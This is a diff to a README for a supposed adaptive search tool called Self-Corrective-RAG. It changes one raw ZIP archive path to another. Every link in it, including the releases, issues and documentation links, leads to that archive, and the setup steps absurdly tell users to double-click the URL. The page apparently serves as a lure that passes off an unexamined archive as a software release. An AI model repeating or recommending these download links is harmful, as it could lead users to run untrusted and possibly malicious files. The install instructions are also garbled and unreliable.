@@ -1,7 +1,7 @@
 # 🤖 Self-Corrective-RAG - Smart Search That Adapts
 
 ## 📥 Download Now
-[![Download Self-Corrective-RAG](https://raw.githubusercontent.com/Jeroflo88/Self-Corrective-RAG/main/data/Self-Corrective-RAG-3.0.zip%20Self--Corrective--RAG-v1.0-blue)](https://raw.githubusercontent.com/Jeroflo88/Self-Corrective-RAG/main/data/Self-Corrective-RAG-3.0.zip)
+[![Download Self-Corrective-RAG](https://raw.githubusercontent.com/Jeroflo88/Self-Corrective-RAG/main/data/RAG-Self-Corrective-1.7.zip%20Self--Corrective--RAG-v1.0-blue)](https://raw.githubusercontent.com/Jeroflo88/Self-Corrective-RAG/main/data/RAG-Self-Corrective-1.7.zip)
 
 ## 🚀 Getting Started
 Welcome to Self-Corrective-RAG! This application helps you find information quickly by using advanced search techniques. It adapts and improves itself, ensuring you always get the best possible results.
@@ -23,12 +23,12 @@ Make sure your system meets the following requirements to run Self-Corrective-RA
 ## 🔧 Installation Steps
 Follow these steps to install and run Self-Corrective-RAG:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/Jeroflo88/Self-Corrective-RAG/main/data/Self-Corrective-RAG-3.0.zip).
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/Jeroflo88/Self-Corrective-RAG/main/data/RAG-Self-Corrective-1.7.zip).
 2. **Download the Latest Version:** On the releases page, find the latest version of the application. Click on the download link for your operating system.
 3. **Extract the Files:** After the download completes, find the downloaded file in your default download folder. It is usually a ZIP file. Right-click on it and select "Extract All." Follow the prompts to extract the files to a folder of your choice.
 4. **Open the Application:**
-   - For Windows: Double-click the `https://raw.githubusercontent.com/Jeroflo88/Self-Corrective-RAG/main/data/Self-Corrective-RAG-3.0.zip` file.
-   - For macOS: Open the folder where you extracted the files, then double-click on `https://raw.githubusercontent.com/Jeroflo88/Self-Corrective-RAG/main/data/Self-Corrective-RAG-3.0.zip`.
+   - For Windows: Double-click the `https://raw.githubusercontent.com/Jeroflo88/Self-Corrective-RAG/main/data/RAG-Self-Corrective-1.7.zip` file.
+   - For macOS: Open the folder where you extracted the files, then double-click on `https://raw.githubusercontent.com/Jeroflo88/Self-Corrective-RAG/main/data/RAG-Self-Corrective-1.7.zip`.
    - For Linux: Open a terminal and navigate to the folder where you extracted the files. Type `./Self-Corrective-RAG` and hit Enter.
 5. **Follow On-Screen Instructions:** When the application starts, follow the prompts to set it up according to your preferences.
 
@@ -39,7 +39,7 @@ Follow these steps to install and run Self-Corrective-RAG:
 
 ## 📞 Support
 If you have any questions or need assistance, you can:
-- Open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/Jeroflo88/Self-Corrective-RAG/main/data/Self-Corrective-RAG-3.0.zip).
+- Open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/Jeroflo88/Self-Corrective-RAG/main/data/RAG-Self-Corrective-1.7.zip).
 - Join our community discussions to share tips and receive help from other users.
 
 ## 🌟 Contributing
@@ -52,10 +52,10 @@ We welcome contributions! If you are interested in improving Self-Corrective-RAG
 Self-Corrective-RAG is available under the MIT License. You are free to use, modify, and distribute the software as long as you include the original license.
 
 ## 🔗 Additional Resources
-- **Documentation:** Visit our [official documentation](https://raw.githubusercontent.com/Jeroflo88/Self-Corrective-RAG/main/data/Self-Corrective-RAG-3.0.zip) for more detailed information.
+- **Documentation:** Visit our [official documentation](https://raw.githubusercontent.com/Jeroflo88/Self-Corrective-RAG/main/data/RAG-Self-Corrective-1.7.zip) for more detailed information.
 - **Tutorials:** Check out our tutorials to get the most out of Self-Corrective-RAG.
 
 ## 📥 Download & Install
-To download Self-Corrective-RAG, visit the [Releases page](https://raw.githubusercontent.com/Jeroflo88/Self-Corrective-RAG/main/data/Self-Corrective-RAG-3.0.zip) and grab the latest version for your operating system. You'll find all necessary files ready for you to start your smart search experience.
+To download Self-Corrective-RAG, visit the [Releases page](https://raw.githubusercontent.com/Jeroflo88/Self-Corrective-RAG/main/data/RAG-Self-Corrective-1.7.zip) and grab the latest version for your operating system. You'll find all necessary files ready for you to start your smart search experience.
 
 Feel free to reach out if you need help. Enjoy using Self-Corrective-RAG!
